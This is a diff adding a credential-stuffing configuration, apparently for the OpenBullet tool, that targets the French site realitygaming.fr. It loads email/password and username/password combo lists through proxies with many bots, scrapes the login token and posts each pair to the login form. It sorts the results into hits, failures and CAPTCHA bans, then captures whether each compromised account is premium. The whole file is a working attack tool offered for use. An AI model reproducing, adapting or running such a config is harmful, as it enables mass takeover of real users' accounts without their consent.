@@ -1,0 +1,73 @@
+[SETTINGS]
+{
+  "Name": "RealityGamingV2",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-16T10:42:28.0549065+02:00",
+  "AdditionalInfo": "",
+  "Author": "xX-365094-Xx",
+  "Version": "1.2.8 Anomaly",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 10,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://realitygaming.fr/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"_xfToken\" value=\"" "\" />" -> VAR "TOKEN" 
+
+REQUEST POST "https://realitygaming.fr/login/login" 
+  CONTENT "login=<USER>&password=<PASS>&remember=1&_xfRedirect=https%3A%2F%2Frealitygaming.fr%2F&_xfToken=<TOKEN>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "origin: https://realitygaming.fr" 
+  HEADER "referer: https://realitygaming.fr/" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<dl class=\"pairs pairs--justified fauxBlockLink\">" 
+  KEYCHAIN Failure OR 
+    KEY "<form action=\"/login/login\" method=\"post\" class=\"block\">" 
+  KEYCHAIN Ban OR 
+    KEY "terminé la vérification CAPTCHA correctement" 
+
+#PSEUDO PARSE "<SOURCE>" LR "name: \"" "\"" -> CAP "PSEUDO" 
+
+#Id_pour_profil PARSE "<SOURCE>" LR "<h3 class=\"contentRow-header\"><a href=\"" "\" class=\"username \"" -> VAR "KEY2" 
+
+REQUEST GET "https://realitygaming.fr/compte/profile-customization" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "Vous n'avez pas la permission de voir cette page ou d'exécuter cette action" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "Vous n'avez pas la permission de voir cette page ou d'exécuter cette action" 
+
+PARSE "<SOURCE>" LR "\"En tant que membre " ", vous avez" -> CAP "( SI il n'y a pas marqué premium alors vous etes autre chose :p ) VOUS ETES" 
+
